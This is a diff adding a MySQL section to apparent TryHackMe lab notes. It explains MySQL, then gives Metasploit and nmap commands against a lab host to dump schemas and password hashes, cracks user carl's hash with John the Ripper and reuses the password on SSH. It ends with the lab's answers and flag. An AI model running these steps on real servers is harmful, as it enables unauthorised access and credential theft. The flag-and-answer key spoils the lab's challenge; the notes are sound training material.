@@ -534,3 +534,220 @@ If further vulnerabilities are discovered, Metasploit can be used:
 
 This approach is effective against poorly configured mail servers and aids in gaining an initial foothold during penetration testing.
 
+## MySQL
+
+### Understanding MySQL
+
+**What is MySQL?**  
+MySQL is a **Relational Database Management System (RDBMS)** that operates based on **Structured Query Language (SQL)**. Let's break down the key terms:
+
+- **Database**: A structured and persistent collection of data.
+- **RDBMS**: A system used to create and manage relational databases, where data is organized into tables that relate to one another via primary and foreign keys.
+- **SQL**: The language used for interacting with the database, performing operations such as querying, updating, and managing data.
+
+MySQL is one of the most popular implementations of an RDBMS. It uses a **client-server model**, where clients interact with the server using SQL. Other RDBMS products like **PostgreSQL** and **Microsoft SQL Server** also rely on SQL syntax.
+
+---
+
+#### How Does MySQL Work?
+
+MySQL operates as a **server** that processes instructions and requests related to databases. The key workflow can be summarized as follows:
+
+1. **Database Creation**: MySQL creates a database to store and manipulate data, defining relationships between tables.
+2. **Client Requests**: Clients send SQL statements to request operations like data retrieval, insertion, or updates.
+3. **Server Response**: The MySQL server processes the requests and responds with the appropriate information or actions.
+
+The **MySQL Protocol** facilitates communication between the server and its clients.
+
+---
+
+#### What Runs MySQL?
+
+MySQL can run on various platforms, including **Linux** and **Windows**. It is widely used as a backend database system for many major websites. MySQL is a core component of the **LAMP stack**, which consists of:
+
+- **L**inux
+- **A**pache
+- **M**ySQL
+- **P**HP (or Perl/Python)
+
+This combination is especially popular for web development.
+
+---
+
+#### Additional Resources
+
+For a deeper dive into MySQL's technical implementation and working:
+
+- [MySQL Server Documentation: SQL Execution](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html)
+- [W3Schools: PHP and MySQL Introduction](https://www.w3schools.com/php/php_mysql_intro.asp)
+
+This overview provides a basic understanding of MySQL, its operation, and its role in database management systems.
+
+---
+
+#### **Q&A**
+
+**What type of software is MySQL?**  
+MySQL is a **Relational Database Management System (RDBMS)**.
+
+**What language is MySQL based on?**  
+MySQL is based on **Structured Query Language (SQL)**.
+
+**What communication model does MySQL use?**  
+MySQL uses a **client-server communication model**.
+
+**What is a common application of MySQL?**  
+MySQL is commonly used as a backend database for web applications.
+
+**What major social network uses MySQL as their back-end database?**  
+**Facebook** uses MySQL as their primary backend database, heavily customized for their needs.
+
+
+
+### **Enumerating MySQL**
+
+#### **When Do You Attack MySQL?**
+
+MySQL is rarely the initial target for enumeration or exploitation. Instead, it typically becomes relevant after obtaining credentials or other information from other services. For example:
+
+- **Scenario**: After enumerating subdomains of a web server, you discover the credentials `"root:password"`. You try them on SSH without success, then decide to test them on the MySQL service.
+
+---
+
+#### **Requirements**
+
+- **MySQL Client**: Ensure the MySQL client is installed on your system.
+    
+    - **Installation**:
+        
+        ```bash
+        sudo apt install default-mysql-client
+        ```
+        
+    - This installs only the client, not the server.
+- **Metasploit Framework**: Installed by default on Kali Linux and Parrot OS.
+    
+
+---
+
+#### **Alternatives to Metasploit**
+
+You can use other tools to enumerate MySQL if Metasploit is not available:
+
+1. **Nmap’s `mysql-enum` Script**  
+    Documentation: [mysql-enum](https://nmap.org/nsedoc/scripts/mysql-enum.html)  
+    Example Command:
+    
+    ```bash
+    nmap -p 3306 --script=mysql-enum <target-ip>
+    ```
+    
+2. **Exploit-DB Tools**  
+    Example: [Exploit-DB: 23081](https://www.exploit-db.com/exploits/23081)
+    
+3. **Manual Enumeration**  
+    After completing the task, revisit it manually to understand how tools retrieve the information.
+    
+
+---
+
+#### **Let’s Begin!**
+
+Now, use Metasploit or alternative tools to start enumerating MySQL. Ensure you understand the process behind each action to strengthen your knowledge.
+
+
+
+#### **Q&A: Enumerating MySQL**
+
+**1. What port is MySQL using?**  
+**3306**
+
+---
+
+**2. What three options do we need to set?**
+
+- `RHOSTS`
+- `USERNAME`
+- `PASSWORD`
+
+---
+
+**3. What result does the "select version()" command give you?**  
+`5.7.29-0ubuntu0.18.04.1`
+
+---
+
+**4. How many databases are returned?**  
+**4** databases:
+
+- `information_schema`
+- `mysql`
+- `performance_schema`
+- `sys`
+
+
+
+### Exploiting MySQL: Summary
+
+#### What do we know?
+
+- **MySQL Server Credentials**: We have the login details to authenticate.
+- **MySQL Version**: Helps determine exploitable vulnerabilities.
+- **Databases and Their Names**: We know which databases exist, assisting in targeting specific ones.
+
+#### Key Terminology
+
+- **==Schema==**: Synonymous with a database in MySQL. For example, `CREATE SCHEMA` instead of `CREATE DATABASE`.
+- **==Hashes==**: Used to store passwords securely. We extract password hashes to attempt cracking.
+
+---
+
+### Q & A
+
+1. **Module for schema dump**:
+   - Full name: `auxiliary/scanner/mysql/mysql_schemadump`
+   - Command:  
+     ```bash
+     search mysql_schemadump
+     use 0
+     set rhosts 10.10.132.143
+     set username root
+     set password password
+     run
+     ```
+
+2. **Last table dumped**:  
+   - `x$waits_global_by_latency`
+
+3. **Module for hash dump**:
+   - Full name: `auxiliary/scanner/mysql/mysql_hashdump`
+   - Command:  
+     ```bash
+     search mysql_hashdump
+     use 0
+     run
+     ```
+
+4. **Non-default user**:  
+   - `carl`
+
+5. **User/Hash combination**:  
+   - `carl:*EA031893AA21444B170FC2162A56978B8CEECE18`
+
+6. **Cracked password**:  
+   - `doggie`
+   - Command:  
+     ```bash
+     john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+     ```
+
+7. **Password reuse risk**:  
+   - High, due to simplicity of the password.
+   - so we tried it in SSH service we manage to login to Carl's SSH . 
+
+8. **Contents of `MySQL.txt`**:  
+   - `THM{congratulations_you_got_the_mySQL_flag}`
+
+---
+
+This summary provides a clear path of commands and results for exploiting MySQL. Let me know if you need further details!
